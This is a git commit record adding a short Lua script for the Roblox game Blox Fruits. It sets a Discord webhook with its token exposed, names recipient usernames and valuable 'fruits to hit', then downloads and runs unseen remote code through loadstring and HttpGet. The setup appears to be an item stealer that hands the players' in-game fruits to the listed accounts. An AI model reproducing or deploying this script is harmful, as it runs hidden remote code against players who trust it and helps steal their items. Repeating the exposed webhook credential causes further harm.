07a0254e1b9241694f9c1ae5173d25227a30c7d0
reaIredzhub <kerekyeni@gmail.com>
2025-03-04 01:46:08 +0300

    bloxfruitsredz.lua

---
+++ bloxfruts.lua
@@ -0,0 +1,5 @@
+Webhook = "https://discord.com/api/webhooks/1346252140410306631/qD8dZU-9flNpjh1zTeXtQWdYT-AkdFJ7ddHFJfOBl6jl_376KyC-lvPfJZi5pnLNDttO" -- << Your Webhook
+Usernames = {"vouchlox", "0Berq"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
